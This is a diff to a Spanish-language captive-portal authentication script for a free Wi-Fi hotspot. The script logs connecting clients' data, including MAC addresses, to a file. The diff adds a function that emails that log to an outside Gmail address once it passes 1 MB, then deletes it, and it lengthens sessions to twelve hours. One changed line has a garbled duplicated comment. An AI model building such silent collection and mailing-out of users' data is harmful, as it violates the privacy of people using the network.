@@ -5,16 +5,26 @@ MAC="$2"
 
 # Ruta al archivo donde se guardarán los datos
 DATA_FILE="/etc/user_data.txt"
-MAX_SIZE=5242880  # 5 MB en bytes
+MAX_SIZE=1048576  # 1 MB en bytes  MAX_SIZE=1048576  5 MB en bytes
+EMAIL="juanitowifigratis@gmail.com"
 
 # Función para comprobar y borrar el archivo si excede el tamaño máximo
 check_file_size() {
   if [ -f "$DATA_FILE" ]; then
     FILE_SIZE=$(stat -c%s "$DATA_FILE")
     if [ "$FILE_SIZE" -ge "$MAX_SIZE" ]; then
-      rm "$DATA_FILE"
+        send_email "$DATA_FILE"
+	rm "$DATA_FILE"
     fi
   fi
+}
+
+# Función para enviar el archivo por correo electrónico
+send_email() {
+  # Obtener el nombre del archivo
+  FILE_NAME=$(basename "$1")
+  # Enviar el correo electrónico con el archivo adjunto
+  echo "Adjunto el archivo $FILE_NAME que excedió el tamaño máximo de $MAX_SIZE bytes." | mail -s "Archivo Excedido" -a "$1" "$EMAIL"
 }
 
 
@@ -26,7 +36,7 @@ case "$METHOD" in
     if true; then
       # Permite al cliente acceder a Internet durante una hora (3600 segundos)
       # Los siguientes valores son límites de carga y descarga en bytes. 0 para ningún límite.
-      echo 3600 0 0
+      echo 43200 0 0
             check_file_size
 
       # Crear el JSON y guardarlo en el archivo
@@ -39,7 +49,7 @@ EOF
 )
       echo "$JSON_DATA" >> "$DATA_FILE"
 
-      echo 3600 0 0
+      echo 43200 0 0
       exit 0
     else
       # Niega al cliente el acceso a Internet.
